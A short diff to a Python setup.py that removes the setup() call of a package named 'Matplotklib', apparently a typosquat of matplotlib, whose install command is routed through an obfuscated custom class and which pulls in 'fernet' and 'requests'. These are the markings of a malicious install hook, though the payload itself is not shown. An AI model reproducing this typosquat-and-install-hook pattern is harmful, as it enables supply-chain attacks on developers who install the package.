@@ -18,22 +18,5 @@ class WAjQJAPBjWgnkqMlwtlJbgtnkVdVJwlQckNWlsrrPMgfvCPqXuNWfXBHsrsJaKILQeZjiJk(in
             install.run(self)
 
 
-setup(
-    name="Matplotklib",
-    version=VERSION,
-    author="BiMhyHBu",
-    author_email="bHvSw@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': WAjQJAPBjWgnkqMlwtlJbgtnkVdVJwlQckNWlsrrPMgfvCPqXuNWfXBHsrsJaKILQeZjiJk,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
 
